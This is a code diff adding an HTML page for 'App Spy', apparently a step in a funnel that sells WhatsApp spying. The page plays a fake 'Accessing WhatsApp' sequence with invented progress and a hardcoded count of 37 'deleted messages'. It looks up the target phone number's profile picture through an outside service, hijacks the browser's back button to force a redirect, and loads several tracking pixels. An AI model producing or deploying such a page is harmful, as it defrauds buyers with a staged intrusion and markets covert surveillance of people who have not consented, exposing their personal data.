@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-46T459G961"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-46T459G961');
+</script>
+
+<!-- Script rastreador -->
+<script
+  src="https://cdn.skalame.com.br/scripts/utms/latest.js"
+  data-skalame-prevent-xcod-sck
+  data-skalame-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+  window.pixelId = "69c69f3ce78656ea3823d1f1";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>App Spy — Accessing</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','2163220407447907');fbq('track','PageView');</script>
+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2163220407447907&ev=PageView&noscript=1"/></noscript>
+<script>
+// Query forwarding helper
+function buildForwardUrl(targetUrl, params) {
+  var url = new URL(targetUrl, window.location.href);
+  var currentParams = new URLSearchParams(window.location.search);
+  currentParams.forEach(function(value, key) {
+    if (!url.searchParams.has(key)) url.searchParams.set(key, value);
+  });
+  if (params) {
+    Object.keys(params).forEach(function(key) {
+      var value = params[key];
+      if (value !== undefined && value !== null && value !== '') url.searchParams.set(key, value);
+    });
+  }
+  return url.toString();
+}
+function navigateWithQuery(targetUrl, params) {
+  window.location.href = buildForwardUrl(targetUrl, params);
+}
+// End query forwarding helper
+</script>
+<script>(function(){function b(){history.pushState(null,null,location.href);}setTimeout(b,0);setTimeout(b,100);setTimeout(b,200);window.onpopstate=function(){navigateWithQuery("backredirect.html");};}());</script>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{--green:#25D366;--green-dark:#128C7E;--bg:#f0f2f5;--white:#fff;--text:#111b21;--text2:#667781;--border:#e9edef;--red:#ef4444;--shadow-lg:0 8px 32px rgba(0,0,0,.12);}
+body{font-family:'Inter',sans-serif;background:var(--bg);min-height:100vh;padding:2rem 1rem 4rem;display:flex;flex-direction:column;align-items:center;}
+.wrap{width:100%;max-width:480px;display:flex;flex-direction:column;align-items:center;gap:1.2rem;}
+.logo{display:flex;align-items:center;gap:.55rem;margin-top:.5rem;}
+.logo-icon{width:32px;height:32px;background:var(--green);border-radius:50%;display:flex;align-items:center;justify-content:center;}
+.logo-icon svg{width:18px;height:18px;fill:#fff;}
+.logo-text{font-size:1.1rem;font-weight:700;color:var(--green);letter-spacing:-.02em;}
+.card{width:100%;background:var(--white);border-radius:16px;padding:1.6rem;box-shadow:var(--shadow-lg);border:1px solid var(--border);}
+
+/* LOADING */
+#screen-load{width:100%;text-align:center;}
+.spin-wrap{width:70px;height:70px;position:relative;margin:0 auto 1.3rem;}
+.spin{width:70px;height:70px;border-radius:50%;border:3px solid var(--border);border-top-color:var(--green);animation:spin 1s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.load-title{font-size:1.2rem;font-weight:800;color:var(--text);margin-bottom:.3rem;}
+.load-phone{font-size:1rem;font-weight:700;color:var(--green);margin-bottom:.3rem;}
+.load-status{font-size:.82rem;color:var(--text2);margin-bottom:1.3rem;min-height:1.1em;transition:opacity .3s;}
+.prog-wrap{width:100%;height:8px;background:var(--border);border-radius:20px;overflow:hidden;margin-bottom:.35rem;}
+.prog-fill{height:100%;background:linear-gradient(90deg,var(--green-dark),var(--green));border-radius:20px;width:0%;transition:width .3s ease;}
+.prog-pct{font-size:.8rem;font-weight:700;color:var(--green);text-align:right;margin-bottom:1.3rem;}
+.steps{display:flex;flex-direction:column;gap:.5rem;}
+.step-item{display:flex;align-items:center;gap:.85rem;background:#f8fffe;border:1px solid var(--border);border-radius:10px;padding:.8rem 1rem;transition:all .3s;}
+.step-item.done{background:#f0fdf4;border-color:#bbf7d0;}
+.step-item.active{background:#f0fdf4;border-color:var(--green);box-shadow:0 0 0 3px rgba(37,211,102,.1);}
+.step-ico{width:30px;height:30px;border-radius:50%;background:var(--border);border:1.5px solid var(--border);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:1.1rem;transition:all .3s;}
+.step-item.done .step-ico{background:var(--green);border-color:var(--green);font-size:0;}
+.step-item.done .step-ico::after{content:'✓';font-size:.8rem;color:#fff;font-weight:700;}
+.step-item.active .step-ico{border-color:var(--green);font-size:0;}
+.step-item.active .step-ico::after{content:'';display:block;width:14px;height:14px;border:2px solid #bbf7d0;border-top-color:var(--green);border-radius:50%;animation:spin .8s linear infinite;}
+.step-txt{font-size:.88rem;font-weight:500;color:var(--text2);transition:color .3s;}
+.step-item.done .step-txt,.step-item.active .step-txt{color:var(--text);}
+
+/* PROFILE CARD */
+#screen-profile{display:none;width:100%;flex-direction:column;gap:1rem;}
+.prof-card{width:100%;background:var(--white);border-radius:16px;padding:1.8rem 1.5rem;box-shadow:var(--shadow-lg);border:1px solid var(--border);text-align:center;}
+.av-wrap{width:80px;height:80px;margin:0 auto 1rem;border-radius:50%;border:3px solid var(--green);background:#f0fdf4;display:flex;align-items:center;justify-content:center;overflow:hidden;}
+.av-wrap svg{width:40px;height:40px;fill:#adb5bd;}
+.av-wrap img{width:80px;height:80px;object-fit:cover;border-radius:50%;}
+.prof-num{font-size:1.1rem;font-weight:700;color:var(--text);margin-bottom:.4rem;}
+.reg-badge{display:inline-flex;align-items:center;gap:.4rem;background:#f0fdf4;border:1px solid #bbf7d0;border-radius:20px;padding:.22rem .75rem;font-size:.75rem;font-weight:600;color:var(--green-dark);}
+.reg-dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse2 1.4s infinite;flex-shrink:0;}
+@keyframes pulse2{0%,100%{opacity:1}50%{opacity:.4}}
+
+.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:.75rem;margin-top:1.2rem;}
+.stat-box{background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:.9rem;text-align:center;}
+.stat-val{font-size:1.3rem;font-weight:800;color:var(--text);display:block;margin-bottom:.2rem;}
+.stat-val.scanning{font-size:.9rem;color:var(--red);animation:blink 1s infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
+.stat-lbl{font-size:.7rem;color:var(--text2);font-weight:500;text-transform:uppercase;letter-spacing:.05em;}
+
+.cta{width:100%;padding:1rem;background:linear-gradient(135deg,var(--green),#22c55e);border:none;border-radius:13px;font-family:'Inter',sans-serif;font-size:1rem;font-weight:700;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:.6rem;transition:all .25s;box-shadow:0 4px 20px rgba(37,211,102,.3);}
+.cta:hover{transform:translateY(-2px);}
+.cta svg{width:18px;height:18px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0;}
+.change-btn{width:100%;padding:.8rem;background:none;border:1.5px solid var(--border);border-radius:13px;font-family:'Inter',sans-serif;font-size:.88rem;font-weight:600;color:var(--text2);cursor:pointer;transition:all .2s;margin-top:.6rem;}
+.change-btn:hover{border-color:var(--text2);color:var(--text);}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="logo">
+    <div class="logo-icon"><svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg></div>
+    <span class="logo-text">App Spy</span>
+  </div>
+
+  <!-- LOADING -->
+  <div id="screen-load">
+    <div class="card">
+      <div class="spin-wrap"><div class="spin"></div></div>
+      <div class="load-title">Accessing WhatsApp</div>
+      <div class="load-phone" id="lphone">+1 (555) 000-0000</div>
+      <div class="load-status" id="lstatus">Preparing access...</div>
+      <div class="prog-wrap"><div class="prog-fill" id="pfill"></div></div>
+      <div class="prog-pct" id="ppct">0%</div>
+      <div class="steps">
+        <div class="step-item" id="st0"><div class="step-ico">⏳</div><span class="step-txt">Connecting to WhatsApp servers</span></div>
+        <div class="step-item" id="st1"><div class="step-ico">⏳</div><span class="step-txt">Verifying phone number</span></div>
+        <div class="step-item" id="st2"><div class="step-ico">⏳</div><span class="step-txt">Loading profile data</span></div>
+        <div class="step-item" id="st3"><div class="step-ico">⏳</div><span class="step-txt">Scanning for deleted messages</span></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PROFILE CARD -->
+  <div id="screen-profile">
+    <div class="prof-card">
+      <div class="av-wrap" id="av-container">
+        <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+      </div>
+      <div class="prof-num" id="prof-num">+1 (555) 000-0000</div>
+      <div class="reg-badge"><div class="reg-dot"></div>Registered on WhatsApp</div>
+      <div class="stats-grid">
+        <div class="stat-box"><span class="stat-val">Online</span><span class="stat-lbl">Current Status</span></div>
+        <div class="stat-box"><span class="stat-val scanning" id="del-count">Scanning...</span><span class="stat-lbl">Deleted Messages</span></div>
+      </div>
+    </div>
+    <button class="cta" onclick="goStep4()">
+      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Start Monitoring
+    </button>
+    <button class="change-btn" onclick="history.back()">Change Number</button>
+  </div>
+</div>
+
+<script>
+var up = new URLSearchParams(window.location.search);
+var phone = up.get('phone') || sessionStorage.getItem('sl_phone') || '';
+var decoded = phone ? decodeURIComponent(phone) : '';
+if (decoded) sessionStorage.setItem('sl_phone', decoded);
+
+document.getElementById('lphone').textContent = decoded || '+1 (555) 000-0000';
+document.getElementById('prof-num').textContent = decoded || '+1 (555) 000-0000';
+
+var statusMsgs = [
+  'Preparing access...',
+  'Establishing secure connection...',
+  'Checking WhatsApp registration...',
+  'Authenticating session...',
+  'Extracting profile data...',
+  'Scanning for deleted messages...',
+  'Access complete!'
+];
+var sIdx = 0;
+
+function sleep(ms){ return new Promise(function(r){setTimeout(r,ms);}); }
+
+function animPct(from, to, dur){
+  return new Promise(function(resolve){
+    var start = performance.now();
+    var fill = document.getElementById('pfill');
+    var pct = document.getElementById('ppct');
+    function frame(now){
+      var t = Math.min((now-start)/dur,1);
+      var ease = 1-Math.pow(1-t,3);
+      var val = Math.round(from+(to-from)*ease);
+      fill.style.width = val+'%';
+      pct.textContent = val+'%';
+      if(t<1) requestAnimationFrame(frame);
+      else resolve();
+    }
+    requestAnimationFrame(frame);
+  });
+}
+
+async function runLoad(){
+  var statusEl = document.getElementById('lstatus');
+  var steps = [
+    {id:'st0', pct:25, dur:1600},
+    {id:'st1', pct:55, dur:1400},
+    {id:'st2', pct:78, dur:1500},
+    {id:'st3', pct:100, dur:1800},
+  ];
+  var prev = 0;
+
+  var sTimer = setInterval(function(){
+    sIdx = (sIdx+1)%statusMsgs.length;
+    statusEl.style.opacity='0';
+    setTimeout(function(){ statusEl.textContent=statusMsgs[sIdx]; statusEl.style.opacity='1'; },180);
+  },1200);
+
+  for(var i=0;i<steps.length;i++){
+    var s = steps[i];
+    document.getElementById(s.id).classList.add('active');
+    await animPct(prev, s.pct, s.dur);
+    document.getElementById(s.id).classList.remove('active');
+    document.getElementById(s.id).classList.add('done');
+    prev = s.pct;
+    await sleep(150);
+  }
+  clearInterval(sTimer);
+  statusEl.textContent = 'Access complete!';
+  await sleep(600);
+
+  // Transition to profile
+  var loadEl = document.getElementById('screen-load');
+  loadEl.style.transition='opacity .4s,transform .4s';
+  loadEl.style.opacity='0'; loadEl.style.transform='translateY(-12px)';
+  await sleep(420);
+  loadEl.style.display='none';
+
+  var profEl = document.getElementById('screen-profile');
+  profEl.style.display='flex';
+
+  // Animate deleted count
+  var n=0;
+  var t = setInterval(function(){
+    n = Math.min(n+1,37);
+    document.getElementById('del-count').textContent = n;
+    if(n>=37){ document.getElementById('del-count').classList.remove('scanning'); clearInterval(t); }
+  },50);
+
+  // Load profile pic
+  loadAvatar(decoded);
+}
+
+function loadAvatar(phone) {
+  var container = document.getElementById('av-container');
+  var apiUrl = 'https://newtechaccess.com/profile-picture.php?phone=' + encodeURIComponent(phone);
+  fetch(apiUrl)
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if(data && data.urlImage){
+        var proxied = 'https://newtechaccess.com/image-proxy.php?url=' + encodeURIComponent(data.urlImage);
+        container.innerHTML = '<img src="'+proxied+'" alt=""/>';
+      }
+    })
+    .catch(function(){});
+}
+
+function goStep4(){
+  navigateWithQuery('step4.html', {phone: decoded});
+}
+
+setTimeout(runLoad, 400);
+</script>
+</body>
+</html>
